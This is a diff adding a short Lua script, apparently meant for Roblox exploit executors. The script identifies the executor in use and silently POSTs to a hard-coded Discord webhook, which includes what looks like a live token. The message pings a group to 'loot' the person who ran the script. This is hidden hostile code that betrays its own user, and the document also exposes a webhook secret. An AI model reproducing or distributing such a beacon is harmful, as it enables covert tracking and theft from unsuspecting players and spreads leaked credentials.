@@ -1,0 +1,20 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/995300471663230996/Kw5dinLrDGDSOTym5O5zr4_IRN7nWrE2izk4mos7sVzoBuTO916QgNwL0ciZIwvVly5q"
+local data = {
+   ["content"] = "@everyone , We Got A Shitty DumbAss Go Fast Loot Him",
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
